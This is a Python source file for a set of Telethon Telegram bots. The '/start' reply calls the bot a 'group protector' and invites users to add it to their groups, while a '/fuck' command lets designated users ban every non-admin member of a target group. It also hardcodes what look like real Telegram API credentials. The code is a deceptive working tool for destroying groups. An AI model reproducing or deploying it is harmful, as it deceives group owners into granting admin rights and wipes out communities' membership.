import logging
import os
import sys
import re
import platform
from os import getenv
from telethon import TelegramClient, events
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins
from telethon.tl.functions.channels import EditBannedRequest
import tracemalloc

tracemalloc.start()

TOKEN1 = getenv("TOKEN1")
TOKEN2 = getenv("TOKEN2")
TOKEN3 = getenv("TOKEN3")
TOKEN4 = getenv("TOKEN4")
TOKEN5 = getenv("TOKEN5")

API_ID = 25981592
API_HASH = "709f3c9d34d83873d3c7e76cdd75b866"

SUDO = getenv("SUDO").split(" ")
OP = [5207435291]

RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_gifs=True,
    send_stickers=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

logging.basicConfig(level=logging.INFO)

bot1 = TelegramClient('bot1', API_ID, API_HASH).start(bot_token=TOKEN1)
bot2 = TelegramClient('bot2', API_ID, API_HASH).start(bot_token=TOKEN2)
bot3 = TelegramClient('bot3', API_ID, API_HASH).start(bot_token=TOKEN3)
bot4 = TelegramClient('bot4', API_ID, API_HASH).start(bot_token=TOKEN4)
bot5 = TelegramClient('bot5', API_ID, API_HASH).start(bot_token=TOKEN5)


@bot1.on(events.NewMessage(pattern="^/fuck"))
@bot2.on(events.NewMessage(pattern="^/fuck"))
@bot3.on(events.NewMessage(pattern="^/fuck"))
@bot4.on(events.NewMessage(pattern="^/fuck"))
@bot5.on(events.NewMessage(pattern="^/fuck"))
async def banall(event):
    fuck = await event.reply("Usage :\n\n`/fuck [chat_id]`")
    if str(event.sender_id) in SUDO:
        chat_id = int(event.text.split(" ")[1])
        admins = await event.client.get_participants(chat_id, filter=ChannelParticipantsAdmins)
        admins_id = [i.id for i in admins]
        async for user in event.client.iter_participants(chat_id):
            try:
                uid = user.id
                if uid not in admins_id and uid not in SUDO:
                    await event.client(EditBannedRequest(chat_id, uid, RIGHTS))
                    await fuck.edit("`STARTED FUCKING THE GROUP...\n\nCHAT ID = {chat_id}`")
            except:
                pass


@bot1.on(events.NewMessage(pattern="^/start"))
@bot2.on(events.NewMessage(pattern="^/start"))
@bot3.on(events.NewMessage(pattern="^/start"))
@bot4.on(events.NewMessage(pattern="^/start"))
@bot5.on(events.NewMessage(pattern="^/start"))
async def all(event):
    ok = await event.reply("`STARTING...`")
    await ok.edit("`I AM GROUP PROTECTOR BOT TO PROTECT YOUR GROUP PLEASE ADD ME IN YOUR GROUP...\n\nFOR MORE DETAILS CONTACT MY CREATOR HE MADE ME FOR TESTING PURPOSE ONLY...")

@bot1.on(events.NewMessage(pattern="^/restart"))
@bot2.on(events.NewMessage(pattern="^/restart"))
@bot3.on(events.NewMessage(pattern="^/restart"))
@bot4.on(events.NewMessage(pattern="^/restart"))
@bot5.on(events.NewMessage(pattern="^/restart"))
async def restart(event):
    if event.sender_id in OP:
        tct = "`Wait Restarting...`"
        await event.reply(tct)
        try:
            await bot1.disconnect()
            await bot2.disconnect()
            await bot3.disconnect()
            await bot4.disconnect()
            await bot4.disconnect()
        except Exception:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()

print("BOT STARTED SUCCESSFULLY...")


tracemalloc.stop()

bot1._run_until_disconnected()
bot2._run_until_disconnected()
bot3._run_until_disconnected()
bot4._run_until_disconnected()
bot5._run_until_disconnected()

